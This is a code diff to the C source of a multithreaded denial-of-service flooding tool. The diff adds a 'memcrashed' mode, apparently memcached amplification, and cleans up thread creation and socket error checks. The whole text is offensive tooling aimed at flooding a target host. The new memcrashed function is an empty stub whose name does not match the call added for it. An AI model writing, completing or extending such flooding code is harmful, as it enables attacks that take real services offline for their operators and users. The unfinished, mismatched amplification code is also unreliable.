@@ -97,7 +97,7 @@ void _ddos_tcp(char* host, int port, char* packet)
         if (dos_tcp_send_noalloc(sock, packet, buf, _bufsize)) {
             int _error = 0;
             socklen_t len = sizeof(error);
-            int retval = getsockopt(socket, SOL_SOCKET, SO_ERROR, &_error, &len);
+            getsockopt(sock, SOL_SOCKET, SO_ERROR, &_error, &len);
             if (_error != 0) {
                 pthread_mutex_lock(&mutex);
                 shutdown(sock, 2);
@@ -181,12 +181,17 @@ void __ddos_wrapper(_dos_param* x)
         _ddos_tcp(x->host, x->port, x->packet);
     } else if (x->mode == MODE_UDP) {
         _ddos_udp(x->host, x->port, x->packet);
+    }else if(x->mode==MODE_MEMCRASHED){
+        memcrashed_ddos(x);
     } else {
         error("Bad wrapper descriptor!");
         assert(false);
     }
 }
 
+void _ddos_memcrashed(_dos_param* x){
+    
+}
 void ddos(char* host, int port, char* packet, int _tcount, int mode)
 {
     signal(SIGPIPE, SIG_IGN);
@@ -203,21 +208,25 @@ void ddos(char* host, int port, char* packet, int _tcount, int mode)
     psent_old=0.0;
     psent=0.0;
     _dos_param* p = _init_dos_p(host, port, packet, mode);
-    
     pthread_t* _ddos = (pthread_t*)malloc(sizeof(pthread_t) * (_tcount + 1));
     // pthread_mutex_init(&mutex, NULL);
-    if(status){
-        pthread_create(&_ddos[0], NULL, _ddos_stat, NULL);
+    if(status&&mode!=MODE_MEMCRASHED){
+        pthread_create(&_ddos[0], NULL, (void*)_ddos_stat, NULL);
+        status=1;
+    }else if(status&&mode==MODE_MEMCRASHED){
+        pthread_create(&_ddos[0], NULL, (void*)memcrashed_status, NULL);
         status=1;
     }else{
         success("Hit ^C to exit");
         success("DDOSing target %s",host);
     }
+    
     for (int i = status; i < _tcount + 1; i++) {
-        if (pthread_create(&_ddos[i], NULL, __ddos_wrapper, p)) {
+        if (pthread_create(&_ddos[i], NULL, (void*)__ddos_wrapper, p)) {
             error("Failed to create thread #%d!", i);
             continue;
         }
     }
+    
     pthread_join(_ddos[_tcount], NULL);
 }
